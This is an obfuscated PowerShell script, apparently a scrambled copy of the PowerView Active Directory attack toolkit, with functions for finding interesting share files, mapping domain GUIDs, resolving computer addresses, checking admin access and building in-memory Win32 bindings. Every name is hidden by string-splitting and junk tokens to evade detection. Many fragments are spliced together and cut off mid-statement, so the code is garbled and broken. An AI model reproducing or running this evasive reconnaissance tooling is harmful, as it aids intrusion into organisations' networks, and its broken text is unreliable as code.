-FS5zsErVIcS5z,S5zPS5z,S5zlS5z,S5zES5z,S5zsS5z,S5zRunTS5z,S5zime.inTEroS5z,S5z.MarShAS5z) )  ;   YoV{JIJKFI} =  [tyPE](Z3b{3}{4}{5}{1}{6}{2}{0}Z3b-f S5ziALS5z,S5zatioN.pS5z,S5zedEntS5z,S5zmANAGeMeS5z,S5znT.AS5z,S5zutOmS5z,S5zSCrS5z) ;   &(S5zsvS5z)  J1F  (  [TyPe](Z3b{2}{4}{1}{6}{8}{5}{7}{9}{0}{3}Z3b-F S5zfoS5z,S5zErViCes.aS5z,S5zsYSTeS5z,S5zREstS5z,S5zm.dIRECtORYsS5z,S5zDIReCS5z,S5zcS5z,S5ztORyS5z,S5zTiveS5z,S5z.S5z))  ;   &(Z3b{2}{0}{1}Z3b -f S5zItS5z,S5zEmS5z,S5zset-S5z)  variAblE:QpU29 ([tYpe](Z3b{2}{1}{0}Z3b-FS5zGS5z,S5zrINS5z,S5zstS5z)) ;  YoV{6RkIJK2IJK5p} =  [tYPE](Z3b{0}{1}Z3b -f S5ziS5z,S5znTPtrS5z)  ;  &(Z3b{1}{0}{2}Z3b -f S5zT-S5z,S5zsES5z,S5zitemS5z)  (S5zVARIABS5z+S5zlE:R2S5z+S5z6S5z+S5z9fS5z) (  [TYpe](Z3b{0}{1}Z3b-F S5zINT3S5z,S5z2S5z)  ); 












function newIJK-inMIJKEMIJKorYMODIJKUIJKlE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{6}{8}{0}{5}{1}{9}{3}{7}{4}Z3b -fS5zaS5z,S5zngS5z,S5zPSUseShouldProcessForStatS5z,S5zunctiS5z,S5zsS5z,S5zngiS5z,S5zeS5z,S5zonS5z,S5zChS5z,S5zFS5z}, S5zS5z)]
    [CmdletBinding()]
    Param (
        [Parameter(posITIon = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{MODIJKUleIJKNaIJKmE} =  ( &(S5zlSS5z)  (Z3bvaZ3b+Z3brIaBZ3b+Z3blZ3b+Z3be:VnYhZ3b+Z3bAqZ3b)  ).Z3bvIJKAlueZ3b::(Z3b{0}{1}Z3b-fS5zNewS5z,S5zGuidS5z).Invoke().(Z3b{0}{1}Z3b-f S5zToStrinS5z,S5zgS5z).Invoke()
    )

    YoV{APpIJKDoMIJKAin} =  ( &(Z3b{1}{0}Z3b-fS5zAriABleS5z,S5zVS5z)  WS63d -vAL  ).Z3bAssIJKemIJKBLYZ3b.(Z3b{1}{0}{2}Z3b-fS5ztS5z,S5zGeS5z,S5zTypeS5z).Invoke((Z3b{4}{0}{1}{2}{3}Z3b -f S5zystem.S5z,S5zApS5z,S5zpDomaS5z,S5zinS5z,S5zSS5z)).(Z3b{0}{1}{3}{2}Z3b-fS5zGetS5z,S5zProperS5z,S5zyS5z,S5ztS5z).Invoke((Z3b{3}{1}{4}{0}{2}Z3b -f S5zntDoS5z,S5zurS5z,S5zmainS5z,S5zCS5z,S5zreS5z)).(Z3b{1}{0}Z3b-f S5ztValueS5z,S5zGeS5z).Invoke(YoV{NuIJKlL}, @())
    YoV{loADeDIJKAssIJKeMblIJKIEs} = YoV{AIJKppIJKDOmain}.(Z3b{3}{0}{1}{2}Z3b-fS5zetAS5z,S5zssembS5z,S5zliesS5z,S5zGS5z).Invoke()

    foreach (YoV{aS','Z3b -fS5ziS5z,S5zstemseS5z,S5zrvS5z,S5zoperS5z,S5zgsyS5z,S5zackS5z,S5zcepS5z,S5zatinS5z),(Z3b{0}{1}{5}{4}{2}{3}Z3b -fS5zoS5z,S5zperS5z,S5zrsS5z,S5zionS5z,S5zyst','mIt} }
        if (YoV{pIJKSBoIJKUndParaIJKMeterS}[(Z3b{0}{1}{2}Z3b -fS5zTS5z,S5zoS5z,S5zmbstoneS5z)]) { YoV{cOmpuTERIJKSIJKEaRIJKCHeRArGIJKUIJKMEIJKNtS}[(Z3b{1}{0}{2}Z3b-fS5zmbS5z,S5zToS5z,S5zstoneS5z)] = YoV{tIJKombSToIJKNE} }
        if (YoV{psIJKBounDIJKPARIJKAMeTIJKeRs}[(Z3b{2}{1}{0}Z3b -f S5zialS5z,S5zdentS5z,S5zCreS5z)]) { YoV{cOMpuTerseIJKAIJKRChEIJKRIJKAIJKRIJKgUMEntS}[(Z3b{2}{0}{1}Z3b-fS5zredenS5z,S5ztialS5z,S5zCS5z)] = YoV{crIJKedentIIJKAl} }

        if (YoV{PIJKSBOuIJKNIJKDpaRIJKAMeIJKTErS}[(Z3b{1}{0}{3}{2}Z3b -fS5zputeS5z,S5zComS5z,S5zNameS5z,S5zrS5z)]) {
            YoV{TIJKARgeIJKTcOIJKmPUIJKTErS} = YoV{COMpuIJKTeIJKRNIJKAmE}
        }
        else {
            &(Z3b{2}{1}{3}{0}Z3b -f S5zeS5z,S5zite-VeS5z,S5zWrS5z,S5zrbosS5z) (Z3b{9}{2}{16}{6}{12}{19}{10}{8}{3}{15}{13}{14}{11}{1}{17}{18}{7}{5}{0}{4}Z3b -fS5zhe domS5z,S5zyiS5z,S5zndS5z,S5zeFS5z,S5zainS5z,S5ztS5z,S5zInterS5z,S5zn S5z,S5zharS5z,S5z[FiS5z,S5zinSS5z,S5zrS5z,S5zestiS5z,S5zle] QS5z,S5zueS5z,S5ziS5z,S5z-S5z,S5zng compuS5z,S5zters iS5z,S5zngDomaS5z)
            YoV{taIJKRIJKGIJKETcOMPUTIJKERS} = &(Z3b{2}{1}{0}{3}Z3b -fS5zutS5z,S5zmpS5z,S5zGet-DomainCoS5z,S5zerS5z) @ComputerSearcherArguments JGO &(Z3b{1}{0}{2}Z3b -f S5zeS5z,S5zSelect-ObjS5z,S5zctS5z) -ExpandProperty (Z3b{2}{0}{1}Z3b -fS5ztnS5z,S5zameS5z,S5zdnshosS5z)
        }
        &(Z3b{2}{0}{1}Z3b -fS5zrite-VeS5z,S5zrboseS5z,S5zWS5z) Z3b[Find-InterestingDomainShareFile] TargetComputers length: YoV(YoVTargetComputers.Length) Z3b
        if (YoV{tAIJKRIJKgeTIJKCOIJKmIJKpUtERs}.Z3blEnIJKGIJKThZ3b -eq 0) {
            throw (Z','5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+(S5zDaS5z+S5zta[@NameS5z+S5z={0}S5z+S5zTaS5z+S5zrgetUserSS5z+S5zID{0}]={0}S-S5z+S5z1-5S5z+S5z-1S5z+S5z8{0}S5z+S5zS5z+S5z
 S5z)  -F[cHAR]39+S5z S5z+S5z S5z+S5z S5z+S5z S5','           YoV{FoReIJKSToBJIJKEct} =   ( &(Z3b{0}{1}{2}Z3b -f S5zvS5z,S5zaRiaBLS5z,S5zES5z)  (S5zJ1S5z+S5zFS5z)  ).Z3bVIJKALUeZ3b::(Z3b{0}{1}Z3b -fS5zGetForeS5z,S5zstS5z).Invoke(YoV{FORESIJKTCoNIJKTIJKExt})
           ','umIJKents} = @{
        (Z3b{2}{0}{1}Z3b-f S5zarcS5z,S5zhBaseS5z,S5zSeS5z) = YoV{ScIJKhEMaIJKpaIJKTH}
        (Z3b{2}{1}{3}{0}Z3b-f S5zrS5z,S5zFiS5z,S5zLDAPS5z,S5zlteS5z) = (Z3b{2}{1}{0}{4}{3}Z3b-fS5zUIDS5z,S5zIDGS5z,S5z(schemaS5z,S5z)S5z,S5z=*S5z)
    }
    if (YoV{psboIJKUNdPIJKArIJKAMeTERS}[(Z3b{1}{0}Z3b-f S5zomainS5z,S5zDS5z)]) { YoV{SeIJKArCIJKheIJKRargIJKUmeNIJKTS}[(Z3b{1}{0}Z3b-fS5zomainS5z,S5zDS5z)] = YoV{dIJKOmaIJKIN} }
    if (YoV{PsBIJKounIJKdpARaMIJKEtIJKERs}[(Z3b{0}{1}Z3b-fS5zSeS5z,S5zrverS5z)]) { YoV{sEarIJKcheIJKRARIJKGumIJKEnts}[(Z3b{1}{0}Z3b-f S5zrverS5z,S5zSeS5z)] = YoV{seIJKRVer} }
    if (YoV{pSbIJKoundIJKpARaMETEIJKRs}[(Z3b{0}{1}{3}{2}Z3b -f S5zRS5z,S5zeS5z,S5zizeS5z,S5zsultPageSS5z)]) { YoV{sEArIJKcHErIJKARIJKGIJKUMENTs}[(Z3b{1}{2}{0}{3}Z3b-fS5ztPageSizS5z,S5zRS5z,S5zesulS5z,S5zeS5z)] = YoV{ReIJKsUltpIJKAgESIze} }
    if (YoV{psBoUIJKNDPaIJKRIJKAmIJKeTeRs}[(Z3b{0}{3}{1}{2}Z3b-f S5zSerS5z,S5zrTimeLimS5z,S5zitS5z,S5zveS5z)]) { YoV{SeaIJKRchIJKERaIJKRGUmEIJKNts}[(Z3b{0}{3}{1}{2}Z3b-fS5zServerTimS5z,S5zimS5z,S5zitS5z,S5zeLS5z)] = YoV{sIJKErVerTIJKimelIJKimIJKIT} }
    if (YoV{PSIJKBOIJKUnIJKDpaRaMETeRS}[(Z3b{1}{2}{0}Z3b -fS5zlS5z,S5zCredeS5z,S5zntiaS5z)]) { YoV{SEIJKARCHIJKERAIJKRGUIJKmEntS}[(Z3b{2}{0}{1}Z3b -f S5zdenS5z,S5ztialS5z,S5zCreS5z)] = YoV{CIJKRedeNIJKTIaL} }
    YoV{scheIJKmIJKASEAIJKRIJKCHer} = &(Z3b{3}{1}{0}{4}{2}Z3b-fS5z-DoS5z,S5ztS5z,S5znSearcherS5z,S5zGeS5z,S5zmaiS5z) @SearcherArguments

    if (YoV{schEIJKMAsEIJKARIJKCIJKHEr}) {
        try {
            YoV{REIJKSUlIJKTs} = YoV{sIJKCHemIJKAseIJKARChER}.(Z3b{0}{2}{1}Z3b-fS5zFinS5z,S5zlS5z,S5zdAlS5z).Invoke()
            YoV{rIJKeSuIJKlTS} JGO &(Z3b{1}{3}{0}{2}Z3b-fS5ze-ObjecS5z,S5zWhS5z,S5ztS5z,S5zerS5z) {YoV{_}} JGO &(Z3b{4}{3}{2}{0}{1}Z3b -fS5zh-S5z,S5zObjectS5z,S5zEacS5z,S5zrS5z,S5zFoS5z) {
                YoV{GIJKUids}[(&(Z3b{0}{2}{1}Z3b -fS5zNew-OS5z,S5zjectS5z,S5zbS5z) (Z3b{0}{1}Z3b-f S5zGS5z,S5zuidS5z) (,YoV{_}.Z3bpRIJKoPeRIJKTiesZ3b.Z3bSIJKCIJKhemIJKAIdguIdZ3b[0])).Z3bgUIJKIdZ3b] = YoV{_}.Z3bprOIJKperIJKTIeSZ3b.Z3bNIJKAmEZ3b[0]
            }
            if (YoV{REIJKSUlIJKTS}) {
                try { YoV{rEIJKsIJKULts}.(Z3b{1}{0}Z3b -fS5zoseS5z,S5zdispS5z).Invoke() }
                catch {
                    &(Z3b{3}{0}{1}{2}Z3b -fS5z-VeS5z,S5zrbosS5z,S5zeS5z,S5zWriteS5z) (S5z[GeS5z+S5ztS5z+S5z-S5z+S5zDS5z+S5zomainGUIDMap] S5z+S5zErS5z+S5zror S5z+S5zdisposS5z+S5zingS5z+S5z S5z+S5zofS5z+S5z S5z+S5ztS5z+S5zhe S5z+S5zReS5z+S5zsS5z+S5zults S5z+S5zobjeS5z+S5zct: S5z+Z3bYoV_Z3b)
                }
            }
            YoV{sCHIJKeMasIJKeIJKARcIJKHeR}.(Z3b{0}{1}Z3b -fS5zdisS5z,S5zposeS5z).Invoke()
        }
        catch {
            &(Z3b{1}{2}{0}Z3b-fS5z-VerboseS5z,S5zWrS5z,S5ziteS5z) (S5z[GS5z+S5zet-S5z+S5zDoS5z+S5zmainGUIS5z+S5zDS5z+S5zMap]S5z+S5z S5z+S5zES5z+S5zrS5z+S5zror S5z+S5zinS5z+S5z S5z+S5zbuS5z+S5zilS5z+S5zding S5z+S5zGS5z+S5zUID S5z+S5zmapS5z+S5z: S5z+Z3bYoV_Z3b)
        }
    }

    YoV{SIJKEarcHIJKERarguMIJKeIJKNts}[(Z3b{2}{0}{1}Z3b -f S5zaS5z,S5zseS5z,S5zSearchBS5z)] = YoV{SCheIJKMApIJKATH}.(Z3b{2}{0}{1}Z3b-fS5zlS5z,S5zaceS5z,S5zrepS5z).Invoke((Z3b{2}{0}{1}Z3b -f S5zcS5z,S5zhemaS5z,S5zSS5z),(Z3b{0}{1}{2}{3}Z3b -fS5zExtendS5z,S5zeS5z,S5zd-RightS5z,S5zsS5z))
    YoV{seIJKAIJKRCIJKheRarguMIJKenIJKTS}[(Z3b{1}{2}{0}Z3b-fS5zerS5z,S5zLDAS5z,S5zPFiltS5z)] = ((Z3b{5}{0}{1}{2}{3}{7}{6}{8}{4}Z3b -fS5zctClaS5z,S5zss=cS5z,S5zontS5z,S5zrS5z,S5zssRight)S5z,S5z(objeS5z,S5zAS5z,S5zolS5z,S5zcceS5z))
    YoV{RIJKiGHtSSIJKEIJKArCIJKHER} = &(Z3b{2}{0}{1}{3}{4}Z3b -fS5zDomS5z,S5zainSeaS5z,S5zGet-S5z,S5zrcS5z,S5zherS5z) @SearcherArguments

    if (YoV{RighTIJKSseaIJKRCIJKhEr}) {
        try {
            YoV{ReIJKSULIJKTS} = YoV{rIghtIJKsSEaIJKRChIJKER','KTIJKPuTPAIJKTH}, YoV{FIIJKlEMIJKOdE},  ( &(Z3b{0}{3}{2}{1}Z3b -fS5zGet-vS5z,S5zBLeS5z,S5zIaS5z,S5zArS5z)  (Z3bs3Z3b+Z3bzTeMZ3b)).Z3bVAIJKLueZ3b::Z3bwrIIJKTeZ3b,   YoV{kIJKVX}::Z3brIJKEaDZ3b)
        YoV{cIJKSVWrITIJKEr} = &(Z3b{2}{1}{0}Z3b -fS5zjectS5z,S5z-ObS5z,S5zNewS5z) (Z3b{4}{3}{1}{5}{6}{0}{2}Z3b-fS5ziteS5z,S5ztreaS5z,S5zrS5z,S5zIO.SS5z,S5zSystem.S5z,S5zmS5z,S5zWrS5z)(YoV{cSVstIJKREIJKAM})
        YoV{CSVwRIJKITIJKeR}.Z3bAuTOfLIJKUSHZ3b = YoV{tIJKRue}
    }

    PROCESS {
        ForEach (YoV{eIJKNTIJKRy} in YoV{iNpIJKUIJKTObIJKJect}) {
            YoV{objeCTIJKCIJKSv} = &(Z3b{2}{4}{1}{0}{3}Z3b-f S5zo-CsS5z,S5zTS5z,S5zCoS5z,S5zvS5z,S5znvertS5z) -InputObject YoV{eIJKNIJKTrY} -Delimiter YoV{dIJKeLiMIJKIter} -NoTypeInformation

            if (-not YoV{eXIJKiIJKSts}) {
                
                YoV{oBjEcIJKTIJKcsV} JGO &(Z3b{1}{3}{2}{0}Z3b -fS5zjectS5z,S5zForEaS5z,S5zbS5z,S5zch-OS5z) { YoV{CSIJKVIJKWriteR}.(Z3b{0}{2}{1}Z3b-fS5zWritS5z,S5zeS5z,S5zeLinS5z).Invoke(YoV{_}) }
                YoV{EXiIJKsTS} = YoV{TIJKRuE}
            }
            else {
                
                YoV{oIJKBjEIJKCtCsV}[1..(YoV{OBjEcIJKTIJKcIJKSv}.Z3blIJKenIJKGTHZ3b-1)] JGO &(Z3b{0}{2}{1}{3}Z3b-fS5zForEach-ObS5z,S5zecS5z,S5zjS5z,S5ztS5z) { YoV{csVIJKwrIJKitEr}.(Z3b{0}{1}{2}Z3b -f S5zWrS5z,S5ziS5z,S5zteLineS5z).Invoke(YoV{_}) }
            }
        }
    }

    END {
        YoV{mIJKUtIJKEX}.(Z3b{3}{2}{0}{1}Z3b-fS5zutS5z,S5zexS5z,S5zseMS5z,S5zReleaS5z).Invoke()
        YoV{CSvWRIJKiIJKTeR}.(Z3b{0}{1}Z3b-fS5zDispoS5z,S5zseS5z).Invoke()
        YoV{CIJKsVIJKStIJKReam}.(Z3b{0}{1}Z3b -f S5zDisS5z,S5zposeS5z).Invoke()
    }
}


function rEsoLvEIJK-IJKipAIJKddrIJKess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{3}{0}{4}{2}Z3b -f S5zouS5z,S5zPSS5z,S5zcessS5z,S5zShS5z,S5zldProS5z}, S5zS5z)]
    [OutputType({Z3b{7}{6}{0}{4}{3}{1}{2}{5}Z3b-fS5zagemS5z,S5ztomatiS5z,S5zon.PSS5z,S5znt.AuS5z,S5zeS5z,S5zCustomObjectS5z,S5zManS5z,S5zSystem.S5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItION = 0, VaLUEfrOMPipELINe = YoV{TrIJKUe}, VALUEfRoMPIpeLiNEBYPropErTYnAMe = YoV{tRIJKUe})]
        [Alias({Z3b{2}{1}{0}Z3b -f S5zameS5z,S5zstNS5z,S5zHoS5z}, {Z3b{0}{1}{2}Z3b-fS5zdnS5z,S5zshostnamS5z,S5zeS5z}, {Z3b{0}{1}Z3b -fS5znS5z,S5zameS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{COIJKMPUIJKTIJKernamE} = YoV{EnV:cIJKoMPIJKUTEIJKRNIJKAmE}
    )

    PROCESS {
        ForEach (YoV{CIJKoIJKmPUTer} in YoV{ComPIJKUterIJKNAME}) {
            try {
                @((  YoV{IVIJKgIJKOt}::(Z3b{1}{2}{3}{0}Z3b-f S5zEntryS5z,S5zGS5z,S5zetS5z,S5zHostS5z).Invoke(YoV{cOIJKMIJKPutEr})).Z3bAddreIJKSSIJKliSTZ3b) JGO &(Z3b{2}{1}{0}Z3b -f S5ztS5z,S5zEach-ObjecS5z,S5zForS5z) {
                    if (YoV{_}.Z3badDrEsIJKsFamIJKIIJKlyZ3b -eq (Z3b{3}{1}{0}{2}Z3b-f S5zrS5z,S5znterNetwoS5z,S5zkS5z,S5zIS5z)) {
                        YoV{oIJKUT} = &(Z3b{1}{0}{2}Z3b -f S5z-ObjecS5z,S5zNewS5z,S5ztS5z) (Z3b{0}{1}{2}Z3b-f S5zPSObjS5z,S5zecS5z,S5ztS5z)
                        YoV{OIJKUT} JGO &(Z3b{1}{0}{2}Z3b-fS5z-MS5z,S5zAddS5z,S5zemberS5z) (Z3b{3}{1}{0}{2}Z3b-f S5zpertS5z,S5zproS5z,S5zyS5z,S5zNoteS5z) (Z3b{1}{2}{0}Z3b -f S5zputerNameS5z,S5zCoS5z,S5zmS5z) YoV{cOIJKMIJKpUteR}
                        YoV{OIJKUt} JGO &(Z3b{0}{2}{1}Z3b-fS5zAS5z,S5z-MemberS5z,S5zddS5z) (Z3b{1}{3}{2}{0}Z3b-f S5zertyS5z,S5zNS5z,S5zpropS5z,S5zoteS5z) (Z3b{2}{0}{1}Z3b-f S5zdreS5z,S5zssS5z,S5zIPAdS5z) YoV{_}.Z3bIIJKpaDdReSstIJKOIJKstRIJKINgZ3b
                        YoV{OIJKUT}
                    }
                }
            }
            catch {
                &(Z3b{2}{0}{1}Z3b -fS5ze-VerbS5z,S5zoseS5z,S5zWritS5z) (S5z[ResolveS5z+S5z-S5z+S5zIPS5z+S5zAddS5z+S5zress] S5z+S5zCouS5z+S5zld S5z+S5znotS5z+S5z S5z+S5zrS5z+S5zesolvS5z+S5ze S5z+Z3bYoVComputer Z3b+S5ztoS5z+S5z S5z+S5zanS5z+S5z S5z+S5zIS5z+S5zP S5z+S5zAdS5z+S5zdress.S5z)
            }
        }
    }
}


function COIJKNIJKVertTo-IJKSID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{1}{0}Z3b -fS5zcessS5z,S5zldProS5z,S5zPSShouS5z}, S5zS5z)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mANdATory = YoV{tIJKRUe}, VaLUefrOMpiPeLIne = YoV{tIJKRue}, VaLUEfROmPiP','5zssS5z)
&(Z3b{2}{0}{1}Z3b-fS5zet-AlS5z,S5ziasS5z,S5zSS5z) (Z3b{3}{0}{2}{1}Z3b-fS5z-SiteNaS5z,S5zeS5z,S5zmS5z,S5zGetS5z) (Z3b{3}{5}{0}{4}{1}{2}Z3b-fS5ztComS5z,S5zuterSiteNaS5z,S5zmeS5z,S5zGet-S5z,S5zpS5z,S5zNeS5z)
&(Z3b{1}{2}{0}Z3b -f S5zasS5z,S5zSetS5z,S5z-AliS5z) (Z3b{1}{0}{3}{2}Z3b-fS5zPS5z,S5zGet-S5z,S5zoxyS5z,S5zrS5z) (Z3b{4}{1}{0}{2}{3}Z3b','           (Z3b{0}{1}Z3b -f S5zS-1-S5z,S5z5-6S5z)       { (Z3b{0}{1}Z3b-fS5zSS5z,S5zerviceS5z) }
                    (Z3b{1}{0}Z3b -fS5z-5-7S5z,S5zS','anS5z+S5zd
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z*S5z+S5z[
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z ','{tIJKRUE})]
        [Alias({Z3b{0}{2}{1}Z3b-fS5zDNSHS5z,S5zmeS5z,S5zostNaS5z})]
        [String[]]
        YoV{CIJKOMIJKpIJKUteRName},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{cIJKompUTIJKEIJKRdIJKOMain},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{coMIJKpUTeRLdaIJKPIJKFiLTIJKEr},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{CoMpUTIJKeIJKRSeaIJKRCIJKhBAIJKSE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{0}{1}{2}Z3b -f S5zpeS5z,S5zrS5z,S5zatingSystemS5z,S5zOS5z})]
        [String]
        YoV{compuTEROIJKpErIJKATIJKingIJKsYSTIJKem},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b-f S5zcS5z,S5zkS5z,S5zServicePaS5z})]
        [String]
        YoV{cIJKOmPUIJKTeIJKRsErvicIJKEpack},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}Z3b-fS5zSiteNS5z,S5zeS5z,S5zamS5z})]
        [String]
        YoV{COIJKmPIJKUteRsItIJKeIJKNAME},

        [Switch]
        YoV{cIJKhecKshIJKAIJKREACIJKCESs},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b -f S5zerS5z,S5zrollS5z,S5zDomainContS5z})]
        [String]
        YoV{sIJKErvIJKER},

        [ValidateSet({Z3b{0}{1}Z3b-f S5zBS5z,S5zaseS5z}, {Z3b{1}{0}Z3b -f S5zneLevelS5z,S5zOS5z}, {Z3b{0}{1}{2}Z3b-fS5zSuS5z,S5zbtS5z,S5zreeS5z})]
        [String]
        YoV{sEarIJKChSCIJKopE} = (Z3b{0}{1}{2}Z3b-fS5zSubS5z,S5ztS5z,S5zreeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{resIJKUltpAIJKGIJKESIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SIJKErIJKVertIJKIMIJKELImit},

        [Switch]
        YoV{tOmIJKBIJKsTOIJKNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{crIJKeDIJKentIJKIAL} =   (  &(Z3b{2}{1}{0}{3}{4}Z3b-fS5zLditS5z,S5zIS5z,S5zgET-chS5z,S5zES5z,S5zMS5z)  (S5zvAS5z+S5zRiablE:JfS5z+S5ziS5z)  ).Z3bVaIJKLuEZ3b::Z3bEmIJKPtyZ3b,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{dIJKeLIJKAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        YoV{jIIJKTIJKTEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        YoV{ThIJKREIJKAdS} = 20
    )

    BEGIN {
        YoV{coMPIJKUTERSeaIJKRCIJKhIJKEIJKRarguIJKmIJKeNTS} = @{
            (Z3b{2}{0}{1}Z3b -fS5zopertiS5z,S5zesS5z,S5zPrS5z) = (Z3b{2}{0}{3}{1}Z3b -fS5zstnaS5z,S5zeS5z,S5zdnshoS5z,S5zmS5z)
        }
        if (YoV{PsIJKBoUndPAIJKRAIJKmIJKEIJKTers}[(Z3b{0}{3}{1}{2}Z3b -f S5zComputS5z,S5zomaS5z,S5zinS5z,S5zerDS5z)]) { YoV{cIJKomPuTIJKerSEArCHEraIJKRGuMEIJKNts}[(Z3b{0}{1}Z3b -fS5zDomaS5z,S5zinS5z)] = YoV{CIJKoMPuTIJKErdIJKomain} }
        if (YoV{psbIJKOIJKUndpaRAMetIJKers}[(Z3b{2}{3}{1}{4}{0}Z3b -fS5zrS5z,S5zuterLDAPFiltS5z,S5zCS5z,S5zompS5z,S5zeS5z)]) { YoV{COMPIJKUTeRIJKseaRcHerIJKARgumEnIJKTS}[(Z3b{1}{0}{2}Z3b -f S5zPFilteS5z,S5zLD','z,S5zTesS5z,S5zcessS5z) -ComputerName YoV{tIJKARGeIJKTCIJKoIJKMPuTEr}
                    if (YoV{acIJKcIJKEss}.Z3bisADIJKMiNZ3b) {
                        YoV{tAIJKRGIJKEtCOIJKmIJKpUTer}
                    }
                }
            }

            if (YoV{tokeIJKNIJKhaIJKNDle}) {
                &(Z3b{2}{4}{5}{1}{3}{0}Z3b -fS5zlfS5z,S5zrtTS5z,S5zInvS5z,S5zoSeS5z,S5zoke-RevS5z,S5zeS5z)
            }
        }

        YoV{logONIJKTIJKOken} = YoV{NIJKUlL}
        if (YoV{pIJKsboUIJKNDPIJKArAmIJKETIJKErs}[(Z3b{0}{2}{3}{1}Z3b-f S5zCS5z,S5zentialS5z,S5zrS5z,S5zedS5z)]) {
            if (YoV{PIJKsBOIJKUNdPArAmeIJKTErs}[(Z3b{0}{1}Z3b -f S5zDelaS5z,S5zyS5z)] -or YoV{pSbOIJKUIJKNDparAMeIJKTIJKERs}[(Z3b{1}{2}{0}Z3b-f S5zOnSuccessS5z,S5zSS5z,S5ztopS5z)]) {
                YoV{lOGoIJKNtIJKoKen} = &(Z3b{5',') (Z3b{5}{11}{10}{2}{12}{17}{9}{0}{3}{6}{14}{16}{4}{13}{1}{8}{15}{19}{7','sIJKeMBIJKLy} in YoV{lOIJKAIJKDeIJKdaSSEmBLIIJKES}) {
        if (YoV{aSSeIJKMbIJKly}.Z3bFULIJKLIJKNAmeZ3b -and (YoV{AIJKSSEMBly}.Z3bFuLIJKLIJKNAmEZ3b.(Z3b{1}{0}Z3b -f S5zlitS5z,S5zSpS5z).Invoke(S5z,S5z)[0] -eq YoV{MoIJKDulIJKENAME})) {
            return YoV{asIJKSIJKEMBIJKLY}
        }
    }

    YoV{dYnASsIJKEIJKMbIJKlY} = &(Z3b{1}{2}{0}Z3b -fS5z-ObjectS5z,S5zNeS5z,S5zwS5z) (Z3b{2}{1}{4}{0}{3}Z3b-f S5zlyS5z,S5zfS5z,S5zReS5z,S5zNameS5z,S5zlection.AssembS5z)(YoV{MODuIJKLIJKenaMe})
    YoV{DIJKoMaIN} = YoV{aPIJKpIJKdoMAIJKIn}
    YoV{AIJKSsEmBLybIJKUIJKILdEr} = YoV{dIJKoMAiN}.(Z3b{5}{0}{1}{4}{3}{2}Z3b -fS5zefS5z,S5zineDynamicAS5z,S5zyS5z,S5zsemblS5z,S5zsS5z,S5zDS5z).Invoke(YoV{DYnASIJKsEMBIJKLY}, S5zRunS5z)
    YoV{mODIJKULIJKEBuilDer} = YoV{aIJKSsEIJKmIJKBlybuIJKilDER}.(Z3b{5}{1}{3}{2}{0}{4}Z3b -f S5zMS5z,S5zefS5z,S5znamicS5z,S5zineDyS5z,S5zoduleS5z,S5zDS5z).Invoke(YoV{mIJKodUlEIJKNaIJKmE}, YoV{FIJKAlIJKSE})

    return YoV{MIJKOduLIJKEBUIJKiIJKldeR}
}




function FUIJKNC {
    Param (
        [Parameter(poSItIon = 0, mANdatOrY = YoV{TIJKRuE})]
        [String]
        YoV{DLlIJKName},

        [Parameter(positiOn = 1, mANdatoRY = YoV{TIJKRUe})]
        [string]
        YoV{fUNctIJKionIJKNAME},

        [Parameter(PoSitION = 2, mAndATORy = YoV{tIJKRue})]
        [Type]
        YoV{rEtIJKURNtIJKYIJKpE},

        [Parameter(POSITIOn = 3)]
        [Type[]]
        YoV{pIJKAIJKRAmIJKETERIJKTyPEs},

        [Parameter(POsitIOn = 4)]
        [Runtime.InteropServices.CallingConvention]
        YoV{NaTivecIJKALlIngcOIJKNVEIJKNtiIJKoN},

        [Parameter(PoSitIoN = 5)]
        [Runtime.InteropServices.CharSet]
        YoV{cIJKhAIJKRset},

        [String]
        YoV{EIJKNIJKTIJKRYpoiNT},

        [Switch]
        YoV{seIJKTLIJKAsTIJKEIJKRROr}
    )

    YoV{proIJKPerIJKTIEs} = @{
        (Z3b{0}{1}{2}Z3b -f S5zDllS5z,S5zNamS5z,S5zeS5z) = YoV{dIJKLLnaIJKMe}
        (Z3b{2}{1}{0}{3}Z3b-fS5zamS5z,S5zctionNS5z,S5zFunS5z,S5zeS5z) = YoV{FUNCtIJKIonIJKNaME}
        (Z3b{2}{0}{1}Z3b-f S5zturS5z,S5znTypeS5z,S5zReS5z) = YoV{RIJKeTIJKURNTyIJKpE}
    }

    if (YoV{pIJKArIJKAMeIJKTERtypeS}) { YoV{PRIJKOIJKPIJKertiES}[(Z3b{4}{0}{1}{3}{2}Z3b-f S5zametS5z,S5zeS5z,S5zTypesS5z,S5zrS5z,S5zParS5z)] = YoV{pIJKARamEtErIJKTYIJKpes} }
